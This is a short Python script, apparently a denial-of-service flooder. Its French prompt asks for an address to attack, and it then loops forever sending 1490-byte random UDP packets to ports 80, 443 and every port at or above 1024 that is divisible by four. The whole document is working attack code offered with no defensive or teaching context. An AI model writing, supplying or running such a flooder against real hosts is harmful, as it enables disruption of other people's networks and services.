
import socket 
import random

site=input("Adresse à attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def adressIP(site, port):
    if port==80 or port==443:
        print(port)
        sock.sendto(bytes, (site,port))

    elif (port>=1024) and (port%4==0):
        sock.sendto(bytes, (site,port))
    else:
        pass

port=1
while True:
    print(port)
    adressIP(site, port)
    port = port + 1
    if port == 65534:
        port = 1   


